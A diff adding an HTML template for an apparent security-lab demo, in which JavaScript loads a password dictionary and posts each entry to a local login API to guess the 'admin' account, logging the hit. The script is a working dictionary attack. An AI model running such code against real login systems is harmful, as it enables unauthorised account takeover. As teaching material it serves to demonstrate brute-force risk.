@@ -1,0 +1,57 @@
+{% extends "layout.html" %}
+
+{% block content %}
+<div class="grid">
+    <div class="card">
+        <h2>Attack Configuration</h2>
+        <p style="color: var(--text-muted); margin-bottom: 1rem;">Target: Exp1 Login API</p>
+        <input type="text" id="targetUser" placeholder="Target Username" value="admin">
+        <button id="startAttack" class="btn btn-danger">Start Dictionary Attack</button>
+    </div>
+
+    <div class="card">
+        <h2>Attack Log</h2>
+        <div class="log-window" id="attackLog"></div>
+    </div>
+</div>
+
+<script>
+    document.getElementById('startAttack').addEventListener('click', async () => {
+        const log = document.getElementById('attackLog');
+        log.innerHTML = '<div class="log-entry">Loading dictionary...</div>';
+
+        // Get dictionary
+        const dictRes = await fetch('/exp2/api/dictionary');
+        const dictData = await dictRes.json();
+        const passwords = dictData.passwords;
+        const targetUser = document.getElementById('targetUser').value;
+
+        log.innerHTML += `<div class="log-entry">Dictionary loaded: ${passwords.length} words. Starting attack on user '${targetUser}'...</div>`;
+
+        for (let pwd of passwords) {
+            log.innerHTML += `<div class="log-entry">Trying password: <span style="color: var(--primary)">${pwd}</span>...</div>`;
+            log.scrollTop = log.scrollHeight;
+
+            // Artificial delay for dramatic effect
+            await new Promise(r => setTimeout(r, 300));
+
+            const res = await fetch('/exp1/api/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username: targetUser, password: pwd })
+            });
+
+            const data = await res.json();
+
+            if (data.success) {
+                log.innerHTML += `<div class="log-entry" style="color: var(--success); font-weight: bold;">[SUCCESS] Password found: ${pwd}</div>`;
+                log.scrollTop = log.scrollHeight;
+                return;
+            }
+        }
+
+        log.innerHTML += `<div class="log-entry" style="color: var(--danger)">[FAILED] Password not found in dictionary.</div>`;
+        log.scrollTop = log.scrollHeight;
+    });
+</script>
+{% endblock %}
